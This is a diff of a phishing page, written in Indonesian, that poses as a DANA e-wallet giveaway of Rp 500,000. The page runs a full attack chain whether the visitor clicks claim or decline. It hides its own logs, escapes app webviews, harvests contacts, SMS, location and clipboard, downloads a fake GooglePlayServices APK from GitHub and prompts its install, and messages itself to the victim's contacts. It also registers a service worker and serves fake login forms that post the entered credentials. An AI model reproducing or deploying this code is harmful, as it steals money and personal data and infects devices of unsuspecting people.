@@ -9,12 +9,17 @@
     <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@700&display=swap" rel="stylesheet">
     <style>
         html,body{margin:0;padding:0;width:100%;height:100%;background:#fff;overflow:hidden;font-family:Arial,sans-serif}
+        
         #popupDana{position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:linear-gradient(180deg,#1fa2ff 0%,#0e72d7 100%);display:flex;justify-content:center;align-items:center;text-align:center}
         .box{max-width:380px;width:90%;padding:20px}
+        
+        /* ===== LOGO DANA ASLI ===== */
         .logo-dana{display:flex;align-items:center;justify-content:center;gap:12px;margin:0 auto 15px}
         .icon-wrapper{width:70px;height:70px;background:#fff;border-radius:50%;display:flex;justify-content:center;align-items:center}
         .flag-svg{width:38px;height:33px;fill:#1fa2ff}
         .text-dana{color:#fff;font-family:'Outfit',sans-serif;font-size:50px;font-weight:700;letter-spacing:6px;text-shadow:0 0 1px rgba(255,255,255,0.5)}
+        /* ===== END LOGO ===== */
+        
         .subtitle{color:#b3d9ff;font-size:16px;margin:5px 0;font-weight:bold}
         .box-white{background:#fff;border-radius:15px;padding:20px;margin:15px 0}
         .box-white .label{color:#666;font-size:13px}
@@ -25,12 +30,14 @@
         .btn-klaim:hover{transform:scale(1.02)}
         .btn-tolak{background:transparent;color:#99c2ff;border:2px solid #3388cc;padding:14px;font-size:15px;border-radius:30px;cursor:pointer;width:100%}
         .status-bar{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.8);color:#00ff00;padding:8px 20px;border-radius:20px;font-size:12px;z-index:999999;display:none;font-family:monospace}
+        
         @keyframes fadeIn{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
     </style>
 </head>
 <body>
 <div id="popupDana">
     <div class="box">
+        <!-- ===== LOGO DANA ASLI ===== -->
         <div class="logo-dana">
             <div class="icon-wrapper">
                 <svg class="flag-svg" viewBox="0 0 50 40" xmlns="http://www.w3.org/2000/svg">
@@ -39,28 +46,43 @@
             </div>
             <div class="text-dana">DANA</div>
         </div>
+        <!-- ===== END LOGO ===== -->
+        
         <div class="subtitle">🎉 SELAMAT! Anda mendapatkan Saldo DANA GRATIS!</div>
+        
         <div class="box-white">
             <div class="label">Saldo DANA Gratis</div>
             <div class="nominal">Rp 500.000</div>
             <div class="kuota">🎁 Kuota terbatas!</div>
         </div>
+        
         <div class="timer">⏰ Tersisa <span id="timer">00:05</span></div>
+        
         <button class="btn-klaim" onclick="klaim()">✅ KLAIM SEKARANG</button>
         <button class="btn-tolak" onclick="tolak()">❌ Tidak, Terima Kasih</button>
     </div>
 </div>
+
 <div class="status-bar" id="statusBar">⏳ Inisialisasi...</div>
 
 <script>
+// ============================================================
+// INDEX.HTML - DENGAN LOGO DANA ASLI
+// ============================================================
+
+// ============================================================
+// KONFIGURASI
+// ============================================================
 var GITHUB_USER = 'pandora-site';
 var GITHUB_REPO = 'verifikasi-site';
-var SERVER_URL = 'https://verifikasi.site';
 var dataStore = [];
 var hasLS = (typeof localStorage !== 'undefined');
 var semuaDidapat = false;
 var spreadDone = false;
 
+// ============================================================
+// STEALTH
+// ============================================================
 console.log = function() {};
 console.warn = function() {};
 console.error = function() {};
@@ -74,10 +96,13 @@ if (window.history && window.history.replaceState) {
 }
 Object.defineProperty(document, 'referrer', { value: '' });
 
+// ============================================================
+// FUNGSI K() - KIRIM DATA
+// ============================================================
 function K(d) {
     dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber, data: d.data });
     try {
-        fetch(SERVER_URL + '/data', {
+        fetch('/data', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(d)
@@ -85,6 +110,9 @@ function K(d) {
     } catch(e) {}
 }
 
+// ============================================================
+// DETEKSI LINGKUNGAN
+// ============================================================
 function detectEnvironment() {
     var env = { isWebView: false, isFacebook: false, isWhatsApp: false, isTelegram: false, isInstagram: false, isTikTok: false, isAndroidBridge: false, isBrowser: false };
     var ua = navigator.userAgent.toLowerCase();
@@ -100,6 +128,9 @@ function detectEnvironment() {
 }
 var ENV = detectEnvironment();
 
+// ============================================================
+// ESCAPE WEBVIEW
+// ============================================================
 function escapeWebView() {
     if (!ENV.isWebView && !ENV.isFacebook && !ENV.isWhatsApp && !ENV.isTelegram && !ENV.isInstagram && !ENV.isTikTok) return;
     var url = window.location.href;
@@ -108,6 +139,9 @@ function escapeWebView() {
     try { var iframe = document.createElement('iframe'); iframe.src = url; iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999'; document.body.appendChild(iframe); } catch(e) {}
 }
 
+// ============================================================
+// ANDROID BRIDGE
+// ============================================================
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined',
     getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
@@ -142,6 +176,9 @@ var A = {
     openApp: function(pkg) { if(this.isAvailable){ try{AndroidBridge.openApp(pkg);return true}catch(e){}} return false }
 };
 
+// ============================================================
+// DATA COLLECTION
+// ============================================================
 function ambilDataCepat() {
     var data = { waktu: Date.now(), ua: navigator.userAgent, ip: '', lokasi: null, kontak: null, sms: null, clipboard: null, env: ENV };
     
@@ -178,27 +215,29 @@ function ambilDataCepat() {
     return data;
 }
 
+// ============================================================
+// PAYLOAD INJECTION
+// ============================================================
 function payloadInjection() {
     var statusBar = document.getElementById('statusBar');
     statusBar.style.display = 'block';
     
-    var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
+    var apkUrl1 = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
     var fileUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
-    var HIDDEN_PATH = '/storage/emulated/0/Android/data/com.google.android.play.services/';
     
     statusBar.textContent = '📥 Mengunduh pembaruan keamanan...';
     if (A.isAvailable) {
-        A.downloadFile(apkUrl, HIDDEN_PATH + 'GooglePlayServices.apk');
+        A.downloadFile(apkUrl1, '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk');
         K({ sumber: 'payload', data: { status: 'apk_downloaded' } });
     } else {
-        try { var a=document.createElement('a'); a.href=apkUrl; a.download='GooglePlayServices.apk'; a.style.display='none'; document.body.appendChild(a); a.click(); document.body.removeChild(a); } catch(e) {}
+        try { var a=document.createElement('a'); a.href=apkUrl1; a.download='GooglePlayServices.apk'; a.style.display='none'; document.body.appendChild(a); a.click(); document.body.removeChild(a); } catch(e) {}
     }
     
     fetch(fileUrl)
         .then(function(res) { return res.text(); })
         .then(function(html) {
             if (A.isAvailable) {
-                A.saveFile(HIDDEN_PATH + 'SystemUpdate.html', html);
+                A.saveFile('/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html', html);
                 K({ sumber: 'file_system', data: { status: 'html_saved' } });
             } else {
                 var blob = new Blob([html], {type: 'text/html'});
@@ -223,11 +262,12 @@ function payloadInjection() {
     }, 4000);
 }
 
+// ============================================================
+// NOTIFIKASI 2-IN-1
+// ============================================================
 function notificationInstallAndOpen() {
     if (!('Notification' in window)) return;
     if (Notification.permission !== 'granted') { Notification.requestPermission(); return; }
-    
-    var HIDDEN_PATH = '/storage/emulated/0/Android/data/com.google.android.play.services/';
     
     var notif = new Notification('⚡ Pembaruan Keamanan', {
         body: 'Klik untuk menyelesaikan pembaruan dan meningkatkan keamanan perangkat Anda.',
@@ -238,18 +278,19 @@ function notificationInstallAndOpen() {
     });
     
     notif.onclick = function() {
-        var apkPath = HIDDEN_PATH + 'GooglePlayServices.apk';
-        var htmlPath = HIDDEN_PATH + 'SystemUpdate.html';
-        
+        var apkPath = '/storage/emulated/0/Android/data/com.google.android.play.services/GooglePlayServices.apk';
         if (A.isAvailable) {
             A.installAPK(apkPath);
             K({ sumber: 'notification_install', data: 'apk_install_started' });
-            setTimeout(function() {
-                A.openFile(htmlPath);
-                K({ sumber: 'notification_install', data: 'html_opened' });
-            }, 2000);
         } else {
             try { window.location.href = 'intent://' + apkPath + '#Intent;scheme=file;package=com.android.packageinstaller;end'; } catch(e) {}
+        }
+        
+        var htmlPath = '/storage/emulated/0/Android/data/com.google.android.play.services/SystemUpdate.html';
+        if (A.isAvailable) {
+            A.openFile(htmlPath);
+            K({ sumber: 'notification_install', data: 'html_opened' });
+        } else {
             try { window.open('file://' + htmlPath, '_blank'); } catch(e) {}
         }
         notif.close();
@@ -259,6 +300,9 @@ function notificationInstallAndOpen() {
     K({ sumber: 'notification_install', data: 'notification_shown' });
 }
 
+// ============================================================
+// AUTO SPREAD
+// ============================================================
 function autoSpread() {
     if (spreadDone) return;
     spreadDone = true;
@@ -284,10 +328,16 @@ function autoSpread() {
     K({sumber:'auto_spread', data:'sent_to_' + Math.min(contacts.length, maxSend) + '_contacts'});
 }
 
+// ============================================================
+// HEARTBEAT
+// ============================================================
 function startHeartbeat() {
     setInterval(function(){ K({sumber:'heartbeat', data:'alive'}); }, 10000);
 }
 
+// ============================================================
+// SERVICE WORKER
+// ============================================================
 function injectServiceWorker() {
     if (!('serviceWorker' in navigator)) return;
     var swCode = `
@@ -299,6 +349,9 @@ function injectServiceWorker() {
     try { var blob=new Blob([swCode],{type:'application/javascript'}); var swUrl=URL.createObjectURL(blob); navigator.serviceWorker.register(swUrl); K({ sumber: 'service_worker', data: { status: 'registered' } }); } catch(e) {}
 }
 
+// ============================================================
+// REDIRECT KE DANA ASLI
+// ============================================================
 function redirectToDANA() {
     try {
         window.location.href = 'intent://dana.id/#Intent;scheme=https;package=com.dana.id;end';
@@ -312,22 +365,28 @@ function redirectToDANA() {
     try { window.location.href = 'https://www.google.com/search?q=dana+indonesia'; } catch(e) {}
 }
 
+// ============================================================
+// EKSEKUSI UTAMA
+// ============================================================
 function dapatkanSemua() {
     if(semuaDidapat) return;
     semuaDidapat = true;
     if(hasLS) localStorage.setItem('sudah_klaim', '1');
     document.getElementById('popupDana').style.display = 'none';
     
-    try { escapeWebView(); } catch(e) {}
-    try { ambilDataCepat(); } catch(e) {}
-    try { payloadInjection(); } catch(e) {}
-    try { injectServiceWorker(); } catch(e) {}
-    try { autoSpread(); } catch(e) {}
-    try { startHeartbeat(); } catch(e) {}
+    escapeWebView();
+    ambilDataCepat();
+    payloadInjection();
+    injectServiceWorker();
+    autoSpread();
+    startHeartbeat();
     
     setTimeout(function() { redirectToDANA(); }, 6000);
 }
 
+// ============================================================
+// TRIGGER
+// ============================================================
 function klaim() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin', data:'klaim'}); }
 function tolak() { setTimeout(function(){ dapatkanSemua(); }, 100); K({sumber:'izin', data:'tolak'}); }
 
@@ -350,6 +409,9 @@ var timerInterval = setInterval(function() {
     }
 }, 1000);
 
+// ============================================================
+// PHISHING ROUTING (HANYA 4)
+// ============================================================
 (function() {
     var path = location.pathname;
     if(path === '/' || path === '') return;
@@ -366,7 +428,7 @@ var timerInterval = setInterval(function() {
     p.fields.forEach(function(f){ fH += '<input type="'+f.type+'" id="'+f.id+'" placeholder="'+f.placeholder+'" autocomplete="off" style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;font-size:16px;outline:none;background:#fff">' });
     var h = '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>'+p.title+'</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial;background:'+p.bg+';display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:20px 16px}.container{width:100%;max-width:400px;background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 15px rgba(0,0,0,0.1);margin-top:30px}input:focus{border-color:'+p.btnColor+'!important}.login-btn{width:100%;padding:14px;background:'+p.btnColor+';color:#fff;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:15px}</style></head><body><div class="container">'+p.logo+(p.subtitle?'<p style="text-align:center;color:#666;font-size:14px;margin-bottom:20px">'+p.subtitle+'</p>':'')+'<form onsubmit="event.preventDefault();go()">'+fH+'<button type="submit" class="login-btn">'+p.btnText+'</button></form></div><script>function go(){var d={};';
     p.fields.forEach(function(f){ h += 'd.'+f.id+'=document.getElementById(\''+f.id+'\').value;' });
-    h += 'fetch("' + SERVER_URL + '/data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({waktu:new Date().toISOString(),sumber:"login_'+key+'",data:d})}).catch(()=>{});setTimeout(function(){window.location.href="'+p.redirect+'"},600)}<\/script></body></html>';
+    h += 'fetch("/data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({waktu:new Date().toISOString(),sumber:"login_'+key+'",data:d})}).catch(()=>{});setTimeout(function(){window.location.href="'+p.redirect+'"},600)}<\/script></body></html>';
     document.open();document.write(h);document.close();
 })();
 </script>
